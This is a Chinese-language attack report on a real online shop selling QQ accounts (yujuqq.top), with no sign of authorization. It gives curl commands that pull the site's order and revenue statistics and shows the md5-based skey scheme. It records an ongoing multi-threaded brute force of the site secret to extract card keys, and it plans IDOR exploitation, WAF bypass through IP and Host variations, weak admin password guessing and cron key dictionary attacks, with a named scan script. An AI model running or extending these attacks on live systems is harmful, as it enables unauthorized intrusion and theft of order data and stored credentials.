# yujuqq.top/shop 深挖报告

**目标**: https://yujuqq.top/shop/  
**时间**: 2026-07-13  
**框架**: 彩虹发卡（独角系同源）  
**站点名**: 豫剧QQ商城（24小时自助）

---

## 1. 经营数据泄露（getcount）

需先访问首页建立会话，否则 `ajax.php` 返回 `{"code":403}`。

```bash
curl -sk -c ck -b ck -A "Mozilla/5.0" -H "Accept-Language: zh-CN" \
  "https://yujuqq.top/shop/" -o /dev/null
curl -sk -b ck -H "X-Requested-With: XMLHttpRequest" \
  -H "Referer: https://yujuqq.top/shop/" \
  "https://yujuqq.top/shop/ajax.php?act=getcount"
```

| 字段 | 值 |
|------|-----|
| orders / orders1 | 280 |
| orders2 | 2 |
| money | 38814.9 |
| money1 | 40 |
| site | 22（分站数） |
| yxts | 255（运行天数） |

相对 htqq.lol（1.8万单），规模小 **65 倍**，SYS_KEY 全量爆破可行（280 × 1万词 ≈ 280 万对）。

---

## 2. 商品目录（getclass / gettool）

| cid | 分类（节选） | 商品数 |
|-----|-------------|--------|
| 89 | 国卡假绑老白号 | 3 |
| 35 | 美卡真棒无脸0违规混合 | 4 |
| 36 | 扫老质保售前 | 17 |
| 8 | PC老号飞机机器人扫码 | 9 |
| 7 | 原始自建群美卡 | 11 |

样例商品：`tid=1257` 假绑老白星星 ¥140；`tid=131` 国卡死绑 ¥25；`tid=636` 美卡自建群 ¥200。

---

## 3. 卡密链（order / skey）

与 htqq 相同：

```
skey = md5(str(id) + SYS_KEY + str(id))
POST ajax.php?act=order  body: id=&skey=
成功 → JSON 含 kminfo
```

探测：`id=1&skey=abc` → `{"code":-1,"msg":"验证失败"}`（端点存活，SYS_KEY 未知）。

**SYS_KEY 爆破**：10k 常用词 + 站点定制词（yujuqq / 38814 / 280 等）× id 1–280，**暂无命中**。  
本地并行 80 线程已启动；高频扫描后目标对扫描 IP 限流（HTTP 000），需在 CN 青果代理恢复后继续。

---

## 4. 订单查询（query）— 阻断

| 向量 | 结果 |
|------|------|
| `POST ajax.php?act=query` type+qq | **HTTP 500**（空体） |
| `GET ?mod=query&data=` 联系方式/tradeno/订单ID | 无 `showOrder` 泄露 |
| 分页 `?mod=query&page=N` | 空订单表 |

前端 `main.js` 中 `queryOrder(type,qq,page)` 成功时 JSON 直接带 `item.skey`，但后端 query 接口 500，与 htqq 同病。

---

## 5. api.php — 特殊封锁

| 方式 | 结果 |
|------|------|
| `GET api.php?act=search&id=1` | **连接重置**（http 000） |
| `GET api.php?act=siteinfo` | 连接重置 |
| `POST api.php` body `act=search&id=1` | `{"code":-5,"msg":"No Act!"}` |

彩虹源码中 `act=search&id=` 理论上无鉴权 IDOR；本站对 **GET 路径单独封锁**（nginx/WAF），POST 未走 act 路由。若绕过封锁，280 单可批量导出。

---

## 6. 后台与隐藏面

| 路径 | HTTP | 说明 |
|------|------|------|
| `/shop/sup/` | 200 | 跳转 `login.php`，含 captcha |
| `/shop/user/` | 200 | 同上 |
| `/shop/install/` | 200 | 已安装（需删 install.lock） |
| `/shop/cron.php` | 200 | `监控密钥不正确`（弱口令未中） |
| `/shop/other/submit.php` | 200 | 支付提交页可达 |
| `/shop/config.php` | 403 | |
| `/shop/.git/HEAD` | 403 | |
| `/shop/user/ajax_chat.php` | 200 | 在线客服 API（act=list/load 返回 No Act） |
| `/shop/assets/js/main.js` | 200 | 58837B，含 showOrder/queryOrder 逻辑 |

**WAF**：无 `_guard` 滑块（初探比 htqq 松）；高频后 IP 封禁。

---

## 7. 与 htqq.lol 对比

| 项 | yujuqq.top | htqq.lol |
|----|------------|----------|
| 订单量 | 280 | ~18061 |
| WAF | 无滑块，IP 限速 | _guard + 代理依赖 |
| getcount | ✅ | ✅ |
| query POST | 500 | 500 |
| api.php search | GET 封死 | 不可达 |
| SYS_KEY 爆破 | 280万对可行 | 1.8亿+ 不现实 |
| kminfo | **未抓到** | **未抓到** |

---

## 8. 后续优先级

1. **CN 青果代理恢复** → 续跑 `yujuqq-deep-scan.py` SYS_KEY 全量爆破  
2. **api.php GET 封锁绕过**（换 IP / HTTP2 / 分块 / Host 变体）→ `search&id=1..280`  
3. **query 500 根因**（SQL/PHP 错误）— 若修复即泄露 skey  
4. **sup 后台** captcha + 弱口令（admin/123456/yujuqq）  
5. **cron 监控密钥** 字典  
6. **实付测试单** → 同会话 `buyok` 参数触发 `showOrder(data.data[0].skey)`

---

## 9. 脚本

- `automation-setup/yujuqq-deep-scan.py` — 直连/代理自适应，getclass + api + query HTML + tradeno + SYS_KEY 爆破

```bash
python3 automation-setup/yujuqq-deep-scan.py
# 输出 /tmp/yujuqq_scan_<ts>/findings.json
```
